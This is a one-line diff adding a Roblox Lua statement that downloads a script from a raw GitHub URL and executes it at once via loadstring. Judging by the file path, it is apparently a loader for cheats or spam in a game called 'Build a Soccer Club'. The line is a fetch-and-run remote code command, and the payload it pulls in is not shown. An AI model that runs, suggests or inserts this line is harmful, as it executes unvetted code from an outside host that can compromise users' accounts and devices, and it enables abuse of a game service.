@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/build-a-soccer-club-spam4-rnoi78y6ic13ld.lua"))()
